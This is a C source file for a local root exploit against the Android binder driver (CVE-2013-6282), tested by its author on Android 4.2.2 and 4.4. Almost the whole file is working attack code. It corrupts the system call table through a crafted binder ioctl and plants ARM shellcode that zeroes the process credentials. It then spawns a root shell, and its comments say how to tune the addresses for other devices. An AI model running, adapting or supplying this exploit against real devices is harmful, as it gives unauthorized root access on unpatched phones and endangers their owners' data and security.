/*
 * Just a lame binder local root exploit stub. Somewhat messy but whatever. The bug was reported in CVE-2013-6282.
 *
 * Tested on Android 4.2.2 and 4.4. Kernels 3.0.57, 3.4.5 and few more. All up to 3.4.5 unpatched should be vulnerable.
 * You need to customize the addresses so that they match the target board. On Android, both /proc/kallsyms and dmesg are
 * restricted, thus no automation here.
 *
 * Rigged up by Piotr Szerman. (c) 2013
 *
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

/* Binder transaction request format */
struct binder_write_read {
        signed long     write_size;     /* bytes to write */
        signed long     write_consumed; /* bytes consumed by driver */
        unsigned long   write_buffer;
        signed long     read_size;      /* bytes to read */
        signed long     read_consumed;  /* bytes consumed by driver */
        unsigned long   read_buffer;
} bwr;

#define BR_NOOP			0x0000720c	/* binder memory write value */
#define SC_TABLE		0xc000ee28	/* system call table address */
/* we need to know the lower halfword of the original address of sys_ni_syscall to tailor MMAP_AREA and MMAP_OFF accordingly.
 * you can aid yourself with a NOP block. the higher halfword will in any case become 0x720c. on one of my boxes, the other
 * halfword was 0xdac4. MMAP_AREA must be aligned appropriately. you can extract all the data in question at runtime from
 * /proc/kallsyms and dmesg (not that hard to set off infoleaks with this bug) as long as there are no contraints in place
 */
#define MMAP_AREA		0x720cd000	/* userspace landing point page-aligned address. */
#define MMAP_OFF		0xac4		/* offset within it to plant the payload */
#define NUM_PAGES		16
#define PAGE_SIZE 		4096
#define NOP			0xe1a00000	/* mov r0, r0 */
#define SHELL			"/system/bin/sh"
#define TARGET_APERTURE		68		/* aiming for two adjacent non-implemented syscalls. check arch/arm/kernel/calls.S */
#define BINDER_WRITE_READ	0xc0186201	/* printk your BINDER_WRITE_READ ;) */

/* the target payload */
void __attribute__((regparm(3))) shellcode(void)
{
	asm volatile(

		"__transgressor:;"
		"push	{r0-r12,lr}"		"\n\t"
		"mov	r1, sp"			"\n\t" /* calculate the process descriptor location */
		"bic	r2, r1, #8128"		"\n\t"
		"bic	r2, r2, #63"		"\n\t"
		"ldr	r3, [r2, #12]"		"\n\t"

		"movt	r0, #0"			"\n\t"
		"movw	r0, #0"			"\n\t"

		"ldr    r1, [r3, #492]" 	"\n\t"	/* cred's location may differ depending on the kernel config.
							 * just build and objdump a kernel module with printk(current->cred->uid)
							 * to find out. or pinpoint it with the help of kgdb or whatever ;)
							 */
		"mov	r4, #8"			"\n\t"
		"__loop_cred:;"
		"sub	r4, r4, #1"		"\n\t"
		"str	r0, [r1, #4]!"		"\n\t"
		"teq	r4, #0"			"\n\t"
		"bne	__loop_cred"		"\n\t"

		"ldr	r1, [r3, #488]"		"\n\t"	/* real_cred. overkill? */
		"mov	r4, #8"			"\n\t"
		"__loop_real_cred:;"
		"sub	r4, r4, #1"		"\n\t"
		"str 	r0, [r1, #4]!"		"\n\t"
		"teq	r4, #0"			"\n\t"
		"bne	__loop_real_cred"	"\n\t"

		"ldm	sp!, {r0-r12,pc}"	"\n\t" /* return to ret_fast_syscall */
		"mov	pc, lr"			"\n\t"
	);
}

int
main(int ac, char **av)
{
	char * const shell[] = { SHELL, NULL };
	char *map;
	int fd;

	fprintf(stderr, "[!] binder local root exploit\n[!] (c) piotr szerman\n");

	fd = open("/dev/binder", O_RDWR);

	if(fd < 0)
	{
		fprintf(stderr, "[-] failed to reach out for binder. (%s)\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	map = mmap((void *)MMAP_AREA, NUM_PAGES * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
		MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_LOCKED, 0, 0);

	if(map == (void *)-1)
	{
		perror("mmap() ");
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "[+] userspace map area == 0x%08lx\n", (unsigned long)map);

	fprintf(stderr, "[+] placing NOP block at 0x%08lx\n", (unsigned long)map);
	memset(map, NOP, MMAP_OFF);
	fprintf(stderr, "[+] copying payload to 0x%08lx\n", (unsigned long)map + MMAP_OFF);
	/* look at the objdump of shellcode to see the correct offset */
	memcpy(map + MMAP_OFF, (unsigned char *)shellcode + 8 /* offseting to the __transgressor */, 30 * sizeof(void *) /* copy all opcodes */);

	fprintf(stderr, "[+] constructing rogue data structure.\n");

	bwr.write_size = 0;
	bwr.write_consumed = 0;
	bwr.read_size = 1;
	bwr.read_consumed = 0;
	/* targeting the aperture between 2 undefined system calls in the table */
	bwr.read_buffer = (unsigned long)((unsigned char *)SC_TABLE + TARGET_APERTURE * sizeof(void *) + 2);

	/* calculate process descriptor address with the aid of sp:
	 * task_struct = *( ((unsigned long *) ( (sp & ~(0xbf000000 - 1)) & ~0x3f )) + 3);
	 */

	ioctl(fd, BINDER_WRITE_READ, &bwr);
	close(fd);

	sleep(5); /* give binder ample time to service the transaction. if it's under heavy load, the exploit might fail */

	fprintf(stderr, "[+] r00ting device...\n\n");

	asm volatile(
			"mov r7, %0\n\t"
			"swi 0\n\t"
			: : "I" (TARGET_APERTURE)
		);

	execve(shell[0], shell, NULL);

	return EXIT_FAILURE;
}